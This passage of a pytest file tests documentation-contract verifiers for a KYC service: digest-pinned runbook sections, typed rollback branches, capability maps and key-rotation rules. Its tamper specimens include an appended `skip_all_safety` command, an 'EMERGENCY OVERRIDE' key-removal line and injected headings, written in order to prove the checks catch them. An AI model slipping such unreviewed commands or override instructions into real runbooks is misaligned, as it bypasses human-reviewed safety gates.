    monkeypatch.setattr(_this_module(), "OPERATIONS", _operations_with_procedure(tampered))
    with pytest.raises(AssertionError):
        AUTHORITY_VERIFIERS["OPS.CUTOVER.PROCEDURES"]()


def test_f6_evidence_must_be_uniquely_located():
    """'the' is somewhere in every section, which is exactly why it proved nothing. A quote is
    evidence only when it has ONE location in the digest-bound span."""
    prose = "the window opens. the window closes. nothing else."
    assert _unique_quote_problems(prose, "the window") != []
    assert _unique_quote_problems(prose, "nothing else") == []
    assert _unique_quote_problems(prose, "absent entirely") != []


def test_f7_the_span_marker_is_derived_not_authored():
    """The audit's reproduction: pointing the SUCCEEDED branch at REFUSED's R5 marker made both
    spans start at R5, so the success branch could cite the refusal branch's evidence. The
    marker is now derived from a closed outcome->marker map; authoring one is a TypeError."""
    pr7b = _pr("Migrations 013-023")
    refused = next(b for b in pr7b.rollback_contract.branches
                   if b.outcome == playbook.OUTCOME_REFUSED)
    with pytest.raises(TypeError):
        playbook.RollbackBranch(outcome=playbook.OUTCOME_REFUSED,
                                span_marker="R6. ROLLBACK OUTCOME B",
                                facts=refused.facts)
    for branch in pr7b.rollback_contract.branches:
        assert branch.span_marker == playbook.OUTCOME_MARKERS[branch.outcome]


def test_f7_swapped_or_duplicated_markers_fail_the_marker_check():
    """The playbook side of the same aliasing: markers must each appear exactly once, in
    BRANCH_OUTCOMES order — a duplicate, a swap, and an absence are all located failures."""
    branches = _pr("Migrations 013-023").rollback_contract.branches
    r5 = playbook.OUTCOME_MARKERS[playbook.OUTCOME_REFUSED].lower()
    r6 = playbook.OUTCOME_MARKERS[playbook.OUTCOME_SUCCEEDED].lower()
    assert _branch_marker_problems(f"... {r5} ... {r6} ...", branches) == []
    assert _branch_marker_problems(f"... {r6} ... {r5} ...", branches), "swap accepted"
    assert _branch_marker_problems(f"... {r5} ... {r5} ... {r6} ...", branches), (
        "duplicate accepted"
    )
    assert _branch_marker_problems(f"... {r5} ...", branches), "missing marker accepted"


def test_f8_an_appended_command_fails_even_after_a_digest_repin(tmp_path):
    """The audit's reproduction: append `python -m kyc_tool.ops.skip_all_safety`, re-pin the
    digest, leave the typed records unchanged — the subset check passed. The parsed operator
    inventory must now equal the typed records EXACTLY, in order, with named exemptions."""
    import shutil

    ref = _pr("Bundle-pinning activation").playbook_ref
    root = tmp_path
    target = root / ref.path
    target.parent.mkdir(parents=True, exist_ok=True)
    shutil.copy(REPO / ref.path, target)
    text = target.read_text()
    heading_at = text.index(ref.heading)
    insert_at = text.index("\n## ", heading_at)
    target.write_text(
        text[:insert_at]
        + "\n```bash\npython -m kyc_tool.ops.skip_all_safety\n```\n"
        + text[insert_at:])
    section = _section_bytes(ref, root=root)
    repinned = dataclasses.replace(
        ref, sha256=hashlib.sha256(section.encode()).hexdigest())
    assert _command_inventory_problems(repinned, section), (
        "a dangerous appended command survived a digest re-pin"
    )


def test_f8_dropping_a_typed_command_fails_the_assembled_verifier(monkeypatch):
    """Same exactness from the other side, through the assembled verifier on the REAL file:
    deleting a typed record while the section still publishes the command must fail."""
    import copy

    pr6 = _pr("Bundle-pinning activation")
    weakened_ref = dataclasses.replace(pr6.playbook_ref,
                                       commands=pr6.playbook_ref.commands[:-1])
    tampered = copy.copy(pr6)
    object.__setattr__(tampered, "playbook_ref", weakened_ref)
    monkeypatch.setattr(_this_module(), "OPERATIONS", _operations_with_procedure(tampered))
    with pytest.raises(AssertionError):
        AUTHORITY_VERIFIERS["OPS.CUTOVER.PROCEDURES"]()


def test_f8_the_heading_is_inside_the_digest(tmp_path):
    """The audit's reproduction: rename the heading to a semantic reversal, update the ref's
    heading, keep the old digest — it passed because only the body was hashed."""
    import shutil

    ref = _pr("Bundle-pinning activation").playbook_ref
    target = tmp_path / ref.path
    target.parent.mkdir(parents=True, exist_ok=True)
    shutil.copy(REPO / ref.path, target)
    text = target.read_text()
    renamed_heading = "## 10. SAFE ROLLING DEPLOY — no window needed"
    target.write_text(text.replace(ref.heading, renamed_heading))
    renamed_ref = dataclasses.replace(ref, heading=renamed_heading)
    section = _section_bytes(renamed_ref, root=tmp_path)
    assert hashlib.sha256(section.encode()).hexdigest() != ref.sha256, (
        "the digest ignored the heading: a semantic reversal kept the reviewed pin"
    )


def test_f8_an_indented_same_level_heading_bounds_the_section(tmp_path):
    """CommonMark treats up to three leading spaces before `##` as the same heading level; the
    old boundary scan did not, so an indented heading could smuggle content into the reviewed
    span or silently extend it."""
    import shutil

    ref = _pr("Bundle-pinning activation").playbook_ref
    target = tmp_path / ref.path
    target.parent.mkdir(parents=True, exist_ok=True)
    shutil.copy(REPO / ref.path, target)
    text = target.read_text()
    heading_at = text.index(ref.heading)
    next_at = text.index("\n## ", heading_at)
    mid = heading_at + (next_at - heading_at) // 2
    mid = text.index("\n", mid) + 1
    target.write_text(
        text[:mid] + "   ## 10b. Injected same-level heading\nInjected content.\n" + text[mid:])
    section = _section_bytes(ref, root=tmp_path)
    assert "Injected content" not in section, (
        "an indented same-level heading did not bound the section"
    )
def _live_obligation_ids(live: str) -> list[str]:
    """The blocker list's obligation identifiers, ORDERED, with multiplicity checked — refusing
    malformed and duplicate identifiers BEFORE any coverage comparison (gate audit
    `6c4f54a..91fbde3` finding 11). The old `O\\d` + immediate set() silently mis-read a live
    **O10** and erased a duplicated obligation, so the coverage assert stayed green while the
    spec named work the document never asked about."""
    ids = []
    for raw in re.findall(r"\*\*(O[0-9][^*]*)\*\*", live):
        token = re.fullmatch(r"(O[0-9]+)(?:[^0-9A-Za-z].*)?", raw, re.DOTALL)
        if not token or not re.fullmatch(r"O[1-9][0-9]*", token.group(1)):
            raise ValueError(f"malformed obligation identifier {raw!r} in the live blocker list")
        ids.append(token.group(1))
    duplicates = {i for i in ids if ids.count(i) > 1}
    if duplicates:
        raise ValueError(f"duplicate obligation identifiers {sorted(duplicates)}")
    return ids


def test_f11_gate_the_obligation_parser_reads_complete_identifiers():
    """The audit's specimens: O10 read as O1, duplicate O4 erased, O4a and O01 accepted-shaped.
    Each is now an explicit outcome: complete ids in order, duplicates and malformed refused."""
    assert _live_obligation_ids("**O1** a\n**O2** b\n**O10** c") == ["O1", "O2", "O10"]
    with pytest.raises(ValueError, match="duplicate"):
        _live_obligation_ids("**O4** x\n**O4** y")
    with pytest.raises(ValueError, match="malformed"):
        _live_obligation_ids("**O4a** x")
    with pytest.raises(ValueError, match="malformed"):
        _live_obligation_ids("**O01** x")
    # a titled entry — the live spec's own format — reads as its id, not as malformed
    assert _live_obligation_ids("**O4 (was F3) — both decision writers fenced.**") == ["O4"]


def test_f11_gate_the_old_parser_would_have_misread_the_specimens():
    """Fossil: the defeated `O\\d` + immediate-set() reading, kept executable so the audit's
    reproduction stays red against it forever — a live O10 was invisible and a duplicated O4
    collapsed silently, leaving the coverage assert green."""
    old = set(re.findall(r"\*\*(O\d)\b", "**O1** a **O10** c **O4** x **O4** y"))
    assert "O10" not in old
    assert old == {"O1", "O4"}


# ── Wave-1 gate F9: the capability map, not the counterparty, classifies our roles ────────────────
#
# Gate audit `6c4f54a..91fbde3` finding 9. The accepted "good" O4 matrix said dev_worker is a
# non-writer, and the screen agreed — while the executable entry point constructs BOTH the
# pipeline Worker and the OutboxPublisher and runs them. A stop-and-attest inventory built on
# that matrix omits a live decision/callback writer. TechCraft does not classify IPv4.Global's
# executable roles: one canonical ProcessRole -> capability map does, the O4 screen derives the
# local stances from it, and an entry-point closure sweep keeps the map honest against the code.


def test_f9_gate_dev_worker_demoted_to_non_writer_is_refused():
    """The audit's reproduction verbatim: the previously accepted matrix, dev_worker declared
    non-writer, must now be refused — dev_worker runs the pipeline AND the publisher."""
    from docs.contracts.wire import REQUIRED_WRITER_ROLES

    previously_accepted = {
        "writer_roles": tuple(REQUIRED_WRITER_ROLES), "old_image_full_stop": True,
        "process_roles": {"api": "writer", "pipeline_worker": "writer",
                          "outbox_worker": "writer", "retention": "non-writer",
                          "dev_worker": "non-writer"}}
    problems = wire_module._accept_writer_matrix(previously_accepted)
    assert any("dev_worker" in p for p in problems), (
        f"dev_worker demoted to non-writer was accepted: {problems}"
    )


def test_f9_gate_local_stances_derive_from_the_canonical_capability_map():
    """The wire mirror must EQUAL the stance derived from kyc_tool's own capability map — writer
    exactly when the role carries a decision-write or callback-publish capability — the same
    bind discipline as PLAN_ROLES/ACCOUNTED_PROCESS_ROLES."""
    from kyc_tool.config import (
        CAP_CALLBACK_PUBLISH,
        CAP_DECISION_WRITE,
        ROLE_CAPABILITIES,
    )

    derived = {
        role.value: ("writer" if ROLE_CAPABILITIES[role]
                     & {CAP_DECISION_WRITE, CAP_CALLBACK_PUBLISH} else "non-writer")
        for role in ProcessRole
    }
    assert derived == wire_module.LOCAL_WRITER_STANCES
    assert derived["dev_worker"] == "writer", (
        "the map itself denies what dev_worker's entry point constructs"
    )


def test_f9_gate_every_entry_point_construction_is_covered_by_the_map():
    """Closure against the code: every src module that declares its role (validate_process_role)
    and constructs a writer class must hold the matching capability in the map. Adding a
    construction without updating the map fails here; a library module with no declared role is
    out of scope — the boundary is the executable entry point."""
    from kyc_tool.config import (
        CAP_CALLBACK_PUBLISH,
        CAP_DECISION_WRITE,
        ROLE_CAPABILITIES,
    )

    implications = {"Pipeline": CAP_DECISION_WRITE, "OutboxPublisher": CAP_CALLBACK_PUBLISH}
    covered_any = 0
    for path in sorted(SRC.rglob("*.py")):
        tree = ast.parse(path.read_text())
        declared_roles = {
            node.attr
            for node in ast.walk(tree)
            if isinstance(node, ast.Attribute)
            and isinstance(node.value, ast.Name) and node.value.id == "ProcessRole"
        }
        if not declared_roles:
            continue
        constructed = {
            node.func.id
            for node in ast.walk(tree)
            if isinstance(node, ast.Call) and isinstance(node.func, ast.Name)
            and node.func.id in implications
        }
        for class_name in constructed:
            covered_any += 1
            needed = implications[class_name]
            for role_name in declared_roles:
                role = ProcessRole[role_name]
                assert needed in ROLE_CAPABILITIES[role], (
                    f"{path.relative_to(REPO)}: role {role.value} constructs {class_name} but "
                    f"the capability map does not grant {needed}"
                )
    assert covered_any >= 3, (
        "the closure sweep found almost nothing; the construction patterns changed and this "
        "guard is no longer reading the entry points"
    )
    # the inline manual approve is a decision write with no Pipeline construction to see: the
    # API role's capability is asserted directly, bound to the writer identity it hosts
    assert CAP_DECISION_WRITE in ROLE_CAPABILITIES[ProcessRole.API]


# ── Wave-1 gate F12: future-unit lifecycle is typed, not inferred from a dash ─────────────────────
#
# Gate audit `6c4f54a..91fbde3` finding 12. `state == "—"` means only "no migration" — shipped
# code-only PR 5b carries the same value — so deleting both §G detail sections and re-labelling
# the reserved units as shipped left every verifier green. Unit lifecycle (shipped|pending|future)
# is now separate from migration lifecycle: the reserved units carry the explicit `future` state,
# and a typed registry binds each future unit's §C row AND its §G scope section (by digest) so
# neither can be deleted, promoted, or rewritten to say the capability is permitted without a
# reviewed re-pin.


def test_f12_gate_the_future_units_are_bound_by_the_registry():
    problems = roadmap.future_unit_problems(roadmap.ROADMAP.read_text())
    assert problems == [], problems


def test_f12_gate_marking_a_future_unit_shipped_is_refused():
    """The audit's mutation: §C says PR 5c is SHIPPED. The future-unit registry refuses it, and
    the lineage state contract refuses `future` on any row that carries a migration."""
    text = roadmap.ROADMAP.read_text().replace(
        "| PR 5c | — | future | — |", "| PR 5c | — | shipped | — |")
    assert text != roadmap.ROADMAP.read_text(), "the mutation failed to change the table"
    assert any("PR 5c" in p for p in roadmap.future_unit_problems(text))


def test_f12_gate_deleting_a_scope_section_is_refused():
    """The other mutation: both §G detail sections deleted while the §C rows remain."""
    text = roadmap.ROADMAP.read_text()
    heading = "### PR 7b-inputs — Platform answer artifacts"
    start = text.index(heading)
    end = text.index("\n### ", start + 1)
    gutted = text[:start] + text[end + 1:]
    assert any("PR 7b-inputs" in p for p in roadmap.future_unit_problems(gutted))


def test_f12_gate_rewriting_a_scope_to_permit_the_capability_is_refused():
    """Replacing the reserved scope with 'retirement/resolution permitted' must fail the scope
    digest — a re-pin being the reviewed act, exactly like the playbook sections."""
    text = roadmap.ROADMAP.read_text()
    heading = "### PR 5c — Per-key HMAC retirement evidence"
    start = text.index(heading)
    end = text.index("\n### ", start + 1)
    rewritten = (text[:start]
                 + heading + " — FUTURE\nRetirement is permitted on aggregate telemetry.\n"
                 + text[end + 1:])
    assert any("PR 5c" in p for p in roadmap.future_unit_problems(rewritten))


def test_f12_gate_shipped_no_migration_rows_stay_legal():
    """PR 5b (shipped, code-only, no migration) keeps its `—` and stays outside the future
    registry — the separation is the point, not a new constraint on old rows."""
    records = roadmap.records()
    pr5b = next(r for r in records if r[0] == "PR 5b")
    assert pr5b[1] == "—" and pr5b[2] == []
    for unit in roadmap.FUTURE_UNITS:
        row = next(r for r in records if r[0] == unit)
        assert row[1] == "future" and row[2] == []


# ── Wave-1 gate F13: capability slots and a closed rotation surface ───────────────────────────────
#
# Gate audit `6c4f54a..91fbde3` finding 13. Two survivals: the "shipping any part forces the gate
# forward" claim was only a search of favored names — a consumable helper in a NEW module left
# every verifier green — and free prose could add an alternate retirement instruction (EMERGENCY
# OVERRIDE) to WIRE.SIGN.ROTATION without any gate noticing. The absence is now TYPED: one
# MissingCapability slot per absent authority, consumed by every gate, forced forward by the
# claim verifiers; and the rotation lines are DERIVED from closed step records, so an alternate
# retirement path has no syntax.


def test_f13_gate_the_gates_consume_the_typed_slots():
    """Every refusal must cite the slot's own reason, and flipping a slot to a fake authority
    must move every consumer to the rewrite-me tripwire — never to acceptance."""
    gates = {g.direction: g for g in WIRE.value("WIRE.SIGN.ROTATION_RETIREMENT")}
    assert isinstance(wire_module.RETIREMENT_AUTHORITY, wire_module.MissingCapability)
    assert isinstance(wire_module.ANSWER_ARTIFACT_AUTHORITY, wire_module.MissingCapability)
    assert wire_module.RETIREMENT_AUTHORITY.roadmap_unit == "PR 5c"
    assert wire_module.ANSWER_ARTIFACT_AUTHORITY.roadmap_unit == "PR 7b-inputs"

    fake = object()
    with mock.patch.object(wire_module, "RETIREMENT_AUTHORITY", fake):
        for evidence in ({"kind": "durable_per_key_fleet_witness"},
                         {"kind": "signed_fleet_receipt"}):
            reasons = gates["INBOUND"].refuse(evidence)
            assert reasons and any("rewrite" in r for r in reasons), reasons
        reasons = gates["OUTBOUND"].refuse({"kind": "hmac_signer_cutover_record"})
        assert reasons and any("rewrite" in r for r in reasons), reasons
    with mock.patch.object(wire_module, "ANSWER_ARTIFACT_AUTHORITY", fake):
        item = WIRE.value("WIRE.ORDERING.PENDING_INPUTS")[0]
        reasons = wire_module.resolution_problems(item, {"schema_version": "1"})
        assert reasons and any("rewrite" in r for r in reasons), reasons


def test_f13_gate_a_registered_fake_provider_forces_the_claim_forward(monkeypatch):
    """The lifecycle transition is FORCED: with any non-missing authority in the slot, the
    published BLOCKED/PENDING claims are lies, and their assembled verifiers must fail until the
    claim, the gates, and the ROADMAP unit move in the same change."""
    monkeypatch.setattr(wire_module, "RETIREMENT_AUTHORITY", object())
    with pytest.raises(AssertionError):
        AUTHORITY_VERIFIERS["WIRE.SIGN.ROTATION_RETIREMENT"]()
    monkeypatch.undo()
    monkeypatch.setattr(wire_module, "ANSWER_ARTIFACT_AUTHORITY", object())
    with pytest.raises(AssertionError):
        AUTHORITY_VERIFIERS["WIRE.ORDERING.PENDING_INPUTS"]()


def test_f13_gate_no_src_module_consumes_the_absent_capabilities():
    """The boundary is CONSUMABILITY: runtime code may not import or reference the slots or the
    unshipped per-key/artifact APIs. A dead helper elsewhere is out of scope; a consumer is not."""
    for path in sorted(SRC.rglob("*.py")):
        text = path.read_text()
        for name in ("RETIREMENT_AUTHORITY", "ANSWER_ARTIFACT_AUTHORITY",
                     "inbound_zero_for_key", "docs.contracts"):
            assert name not in text, (
                f"{path.relative_to(REPO)} references {name}: runtime code is consuming a "
                "capability the contracts publish as absent"
            )


def test_f13_gate_the_rotation_lines_are_derived_not_authored():
    """The claim's published lines must EQUAL the derivation from the closed step records — an
    appended line has nowhere to live."""
    assert WIRE.value("WIRE.SIGN.ROTATION") == wire_module.rotation_lines()


def test_f13_gate_the_emergency_override_fails_the_assembled_verifier(monkeypatch):
    """The audit's reproduction verbatim: append 'EMERGENCY OVERRIDE: remove the old inbound key
    after one second; the retirement gate does not apply' and the assembled rotation verifier
    stayed green. Now the value must equal the derivation, so the line has no syntax."""
    lines = (*WIRE.value("WIRE.SIGN.ROTATION"),
             "EMERGENCY OVERRIDE: remove the old inbound key after one second; the retirement "
             "gate does not apply.")
    monkeypatch.setattr(
        _this_module(), "WIRE", _wire_with("WIRE.SIGN.ROTATION", value=lines))
    with pytest.raises(AssertionError):
        AUTHORITY_VERIFIERS["WIRE.SIGN.ROTATION"]()


def test_f13_gate_an_alternate_retirement_action_has_no_syntax():
    """A step outside the closed action set cannot be constructed at all."""
    with pytest.raises(ValueError, match="closed action"):
        wire_module.RotationStep(direction="INBOUND", number=6, action="emergency_remove")


def test_f13_gate_retirement_semantics_live_only_in_gated_sentences():
    """No derived line other than a gated step's own sentence (and its bound rationale) may carry
    retire/remove-the-old semantics — the property the override specimen violates."""
    problems = wire_module.rotation_prose_problems(wire_module.rotation_lines())
    assert problems == []
    tampered = (*wire_module.rotation_lines(),
                "If pressed for time, remove the old entry immediately.")
    assert wire_module.rotation_prose_problems(tampered)


# ── Re-audit unit 1: F1 typed outcomes, F2 total receiver validation, F8 legend semantics ─────────
#
# Re-audit `1826661..b5c7a83` findings 1, 2, 8. The visible Record/Effective/Why cells were
# authored beside verified booleans and could say the opposite; release identity was checked only
# inside the pending branch (partial bindings reached the ordinary table, blank ids and a Boolean
# deadline completed, terminal replays had no durable history to answer from); and the token
# legend was free prose held by keyword checks.


def test_ra1_visible_outcome_cells_cannot_contradict_the_typed_effects(monkeypatch):
    """The audit's reproduction: interim manual row rewritten to 'discard the callback' /
    'NO — replace the manual approval' / 'Apply it anyway.' with booleans intact — both the
    assembled verifier and the prose-mirror test passed. The cells are now DERIVED from closed
    OutcomeKind/ReasonKind records; a tampered cell fails the derivation rebind."""
    import copy

    from docs.contracts import receiver_reference as rr
    from docs.contracts import wire as w

    rows = list(wire_module.RECEIVER_TRANSITIONS)
    target = next(
        i for i, t in enumerate(rows)
        if t.phase == w.INTERIM and "reviewer decided this case" in t.why
    )
    tampered = copy.copy(rows[target])
    object.__setattr__(tampered, "record", "discard the callback")
    object.__setattr__(tampered, "effective", "NO — replace the manual approval")
    object.__setattr__(tampered, "why", "Apply it anyway.")
    rows[target] = tampered
    mutated = tuple(rows)
    monkeypatch.setattr(w, "RECEIVER_TRANSITIONS", mutated)
    monkeypatch.setattr(rr, "RECEIVER_TRANSITIONS", mutated)
    monkeypatch.setattr(
        _this_module(), "WIRE", _wire_with("WIRE.CALLBACK.EFFECTIVENESS", value=mutated))
    with pytest.raises(AssertionError):
        AUTHORITY_VERIFIERS["WIRE.CALLBACK.EFFECTIVENESS"]()


def test_ra1_the_release_table_cells_derive_too(monkeypatch):
    """The completing row's visible cells said it does not complete while completes_release
    stayed True — certified. Same derivation discipline for the release machine."""
    import copy

    from docs.contracts import receiver_reference as rr
    from docs.contracts import wire as w

    rows = list(wire_module.RELEASE_TRANSITIONS)
    target = next(i for i, t in enumerate(rows) if t.completes_release)
    tampered = copy.copy(rows[target])
    object.__setattr__(tampered, "effective", "NO — the release does not complete")
    rows[target] = tampered
    mutated = tuple(rows)
    monkeypatch.setattr(w, "RELEASE_TRANSITIONS", mutated)
    monkeypatch.setattr(rr, "RELEASE_TRANSITIONS", mutated)
    monkeypatch.setattr(
        _this_module(), "WIRE", _wire_with("WIRE.CALLBACK.RELEASE", value=mutated))
    with pytest.raises(AssertionError):
        AUTHORITY_VERIFIERS["WIRE.CALLBACK.RELEASE"]()


def test_ra1_an_outcome_kind_cannot_say_the_opposite_of_its_booleans():
    """The closed record binds text to effect: an effective=True kind whose visible cell reads NO
    is unconstructable, in both directions."""
    with pytest.raises(ValueError):
        wire_module.OutcomeKind(
            records=True, becomes_effective=True, advances_high_water=False,
            completes_release=False, record_text="the callback",
            effective_text="NO — replace the manual approval")
    with pytest.raises(ValueError):
        wire_module.OutcomeKind(
            records=False, becomes_effective=False, advances_high_water=False,
            completes_release=False, record_text="the callback",
            effective_text="NO CHANGE — acknowledge with 2xx and stop")


def test_ra2_partial_release_bindings_never_reach_the_ordinary_table():
    """The audit's matrix: with source None/automatic/manual, release-id-only, manual-id-only,
    and both-present callbacks entered the ordinary table (and could become effective). All are
    now one stable integrity refusal before any row is consulted."""
    from docs.contracts import receiver_reference as rr
    from docs.contracts.wire import POST_024

    for source in (None, "automatic", "manual"):
        state = rr.LedgerState(
            seen_run_ids=frozenset(), current_source=source, high_water=5,
            current_manual_event_id="M1" if source == "manual" else None)
        for fields in ({"release_id": "R1"}, {"manual_event_id": "M1"},
                       {"release_id": "R1", "manual_event_id": "M1"}):
            callback = rr.Callback(case_id="c", run_id="r", decision_sequence=6, **fields)
            with pytest.raises(rr.ReceiverIntegrityError):
                rr.decide(state, callback, phase=POST_024, now=500)


def test_ra2_blank_release_identities_cannot_complete():
    """Blank matching release and manual ids completed. PendingRelease refuses blanks at
    construction, and a bound callback with blank fields is an integrity refusal."""
    from docs.contracts import receiver_reference as rr
    from docs.contracts.wire import POST_024

    with pytest.raises((rr.ReceiverIntegrityError, ValueError)):
        rr.PendingRelease(release_id="", requested_manual_event_id="", deadline=1000)
    state = rr.LedgerState(
        seen_run_ids=frozenset(), current_source="manual_release_pending", high_water=5,
        current_manual_event_id="M1",
        release=rr.PendingRelease(release_id="R1", requested_manual_event_id="M1",
                                  deadline=1000))
    with pytest.raises(rr.ReceiverIntegrityError):
        rr.decide(state, rr.Callback(case_id="c", run_id="r", decision_sequence=6,
                                     release_id=" ", manual_event_id="M1"),
                  phase=POST_024, now=500)


def test_ra2_a_boolean_deadline_cannot_complete():
    """`0 < True` made a Boolean deadline live. Exact int only, Boolean excluded, bounded."""
    from docs.contracts import receiver_reference as rr
    from docs.contracts.wire import POST_024

    with pytest.raises((rr.ReceiverIntegrityError, ValueError)):
        rr.PendingRelease(release_id="R1", requested_manual_event_id="M1", deadline=True)
    for bad_now in (True, "500", -1, 2**63):
        state = rr.LedgerState(
            seen_run_ids=frozenset(), current_source="manual_release_pending", high_water=5,
            current_manual_event_id="M1",
            release=rr.PendingRelease(release_id="R1", requested_manual_event_id="M1",
                                      deadline=1000))
        with pytest.raises(rr.ReceiverIntegrityError):
            rr.decide(state, rr.Callback(case_id="c", run_id="r", decision_sequence=6,
                                         release_id="R1", manual_event_id="M1"),
                      phase=POST_024, now=bad_now)


def test_ra2_hostile_state_shapes_are_one_stable_refusal():
    """Unhashable sources, a None run-id set, and inconsistent source/release pairs escaped as
    incidental TypeErrors or dispatched anyway. Every one is the same typed refusal."""
    from docs.contracts import receiver_reference as rr
    from docs.contracts.wire import POST_024

    hostile = [
        rr.LedgerState(seen_run_ids=frozenset(), current_source=["manual"]),
        rr.LedgerState(seen_run_ids=None, current_source="automatic"),
        rr.LedgerState(seen_run_ids=frozenset(), current_source="manual",
                       current_manual_event_id="M1",
                       release=rr.PendingRelease(release_id="R1",
                                                 requested_manual_event_id="M1",
                                                 deadline=1000)),
    ]
    for state in hostile:
        with pytest.raises(rr.ReceiverIntegrityError):
            rr.decide(state, rr.Callback(case_id="c", run_id="r", decision_sequence=6),
                      phase=POST_024, now=500)


def test_ra2_terminal_release_replays_answer_from_durable_history():
    """'Replaying it returns the original outcome and changes nothing, including after completed
    or expired.' The ledger now carries durable terminal release records; a bound replay answers
    from them — never from the ordinary table, and a bound callback naming a release the ledger
    never knew holds."""
    from docs.contracts import receiver_reference as rr
    from docs.contracts.wire import POST_024

    for terminal in ("completed", "expired", "cancelled"):
        state = rr.LedgerState(
            seen_run_ids=frozenset(), current_source="automatic", high_water=9,
            release_history=(rr.ReleaseTerminal(release_id="R9", terminal=terminal),))
        outcome = rr.decide(
            state, rr.Callback(case_id="c", run_id="r-new", decision_sequence=10,
                               release_id="R9", manual_event_id="M1"),
            phase=POST_024, now=500)
        assert not outcome.record and not outcome.effective
        assert not outcome.advance_high_water and not outcome.completes_release
        assert outcome.release_replay == terminal
    unknown = rr.LedgerState(seen_run_ids=frozenset(), current_source="automatic", high_water=9)
    with pytest.raises(rr.ReceiverIntegrityError):
        rr.decide(unknown, rr.Callback(case_id="c", run_id="r", decision_sequence=10,
                                       release_id="R-never", manual_event_id="M1"),
                  phase=POST_024, now=500)


def test_ra8_a_deceptive_paraphrase_cannot_ride_the_legend(monkeypatch):
    """The audit's reproduction: 'manual' redefined as 'the case mentions a manual approval, but
    no decision is currently in force' — keeps the expected words, avoids the forbidden one,
    reverses the semantics. The legend is now derived from typed token semantics whose checkers
    are verified against concrete observations, and the derived meanings carry a reviewed pin —
    the paraphrase fails the assembled verifier without a re-pin."""
    from docs.contracts import predicates

    semantics = dict(predicates.TOKEN_SEMANTICS)
    original = semantics[predicates.SRC_MANUAL]
    semantics[predicates.SRC_MANUAL] = dataclasses.replace(
        original,
        meaning="the case mentions a manual approval, but no decision is currently in force")
    monkeypatch.setattr(predicates, "TOKEN_SEMANTICS", semantics)
    monkeypatch.setattr(
        _this_module(), "WIRE",
        _wire_with("WIRE.CALLBACK.LEGEND", value=tuple(sorted(predicates.legend().items()))))
    with pytest.raises(AssertionError):
        AUTHORITY_VERIFIERS["WIRE.CALLBACK.LEGEND"]()


def test_ra8_every_token_checker_matches_the_observed_facet():
    """Each token's executable semantics, held to the machines themselves: over every realized
    observation, the facet observes the token exactly when the checker holds."""
    from docs.contracts.receiver_reference import token_semantics_problems

    assert token_semantics_problems() == []


# ── Re-audit unit 2: F3 one total ProcedureDefinition, F4 marked commands, F11 strict ATX ─────────
#
# Re-audit `1826661..b5c7a83` findings 3, 4, 11. The procedure was still assembled from
# cooperating authored objects (plan, ref, contract, profile) that could be swapped or weakened
# one at a time; the command inventory saw only python/alembic roots in backticks and its
# exemptions consumed every identical occurrence; and a hash-prefixed ordinary line passed as a
# heading.


def test_ru3_the_definition_owns_the_complete_procedure(monkeypatch):
    """The audit's five witnesses, run through the assembled verifier. Each was a normal
    construction or copy-level swap of ONE cooperating object; the closed ProcedureDefinition
    now owns the complete structured projection, pinned, so each divergence is a located
    failure."""
    import copy

    from docs.contracts import plan as plan_module

    pr5b = _pr("PR 5b full maintenance window")
    pr6 = _pr("Bundle-pinning activation")
    pr7b = _pr("Migrations 013-023")

    # (a) PR5b rebuilt without the recovery-module blocker
    weakened = tuple(
        dataclasses.replace(p, recovery_module_only_in_new=False)
        if isinstance(p, plan_module.PinnedImage) else p
        for p in pr5b.plan.prerequisites)
    weak_plan = dataclasses.replace(pr5b.plan, prerequisites=weakened)
    tampered = copy.copy(pr5b)
    object.__setattr__(tampered, "plan", weak_plan)
    object.__setattr__(tampered, "when", weak_plan.when())
    object.__setattr__(tampered, "blocks_start", weak_plan.blocks_start())
    monkeypatch.setattr(_this_module(), "OPERATIONS", _operations_with_procedure(tampered))
    with pytest.raises(AssertionError):
        AUTHORITY_VERIFIERS["OPS.CUTOVER.PROCEDURES"]()
    monkeypatch.undo()

    # (b) PR7b's REFUSED branch republished as may-remain-stopped
    refused = next(b for b in pr7b.rollback_contract.branches
                   if b.outcome == playbook.OUTCOME_REFUSED)
    swapped_facts = tuple(
        dataclasses.replace(f, answer=playbook.ENDING_MAY_STOP)
        if f.question == playbook.ENDING else f
        for f in refused.facts)
    swapped_branch = playbook.RollbackBranch(outcome=playbook.OUTCOME_REFUSED,
                                             facts=swapped_facts)
    branches = tuple(swapped_branch if b.outcome == playbook.OUTCOME_REFUSED else b
                     for b in pr7b.rollback_contract.branches)
    contract = copy.copy(pr7b.rollback_contract)
    object.__setattr__(contract, "branches", branches)
    tampered = copy.copy(pr7b)
    object.__setattr__(tampered, "rollback_contract", contract)
    monkeypatch.setattr(_this_module(), "OPERATIONS", _operations_with_procedure(tampered))
    with pytest.raises(AssertionError):
        AUTHORITY_VERIFIERS["OPS.CUTOVER.PROCEDURES"]()
    monkeypatch.undo()

    # (c) bundle pinning transplanted onto PR5b's plan (prior-image rollback for a flag flip)
    tampered = copy.copy(pr6)
    object.__setattr__(tampered, "plan", pr5b.plan)
    object.__setattr__(tampered, "when", pr5b.plan.when())
    object.__setattr__(tampered, "blocks_start", pr5b.plan.blocks_start())
    object.__setattr__(tampered, "rollback_contract", pr5b.rollback_contract)
    statements = pr5b.rollback_contract.statements()
    object.__setattr__(tampered, "irreversible", statements[0])
    object.__setattr__(tampered, "rollback", tuple(statements[1:]))
    monkeypatch.setattr(_this_module(), "OPERATIONS", _operations_with_procedure(tampered))
    with pytest.raises(AssertionError):
        AUTHORITY_VERIFIERS["OPS.CUTOVER.PROCEDURES"]()
    monkeypatch.undo()

    # (d) the subject map rewritten to an imperative — no English parsing; the definition pin
    monkeypatch.setitem(plan_module.PROCEDURE_SUBJECTS,
                        plan_module.SUBJECT_BUNDLE_PINNING, "Start flag-on workers now")
    with pytest.raises(AssertionError):
        AUTHORITY_VERIFIERS["OPS.CUTOVER.PROCEDURES"]()
    monkeypatch.undo()

    # (e) image evidence replaced by a unique but irrelevant quote
    facts = tuple(
        dataclasses.replace(f, evidence="pre-PR6 image")
        if f.question == playbook.IMAGE else f
        for f in pr6.rollback_contract.facts)
    contract = playbook.RollbackContract(facts)
    tampered = copy.copy(pr6)
    object.__setattr__(tampered, "rollback_contract", contract)
    statements = contract.statements()
    object.__setattr__(tampered, "irreversible", statements[0])
    object.__setattr__(tampered, "rollback", tuple(statements[1:]))
    monkeypatch.setattr(_this_module(), "OPERATIONS", _operations_with_procedure(tampered))
    with pytest.raises(AssertionError):
        AUTHORITY_VERIFIERS["OPS.CUTOVER.PROCEDURES"]()


def test_ru4_operator_commands_are_marked_spans_with_any_root(tmp_path):
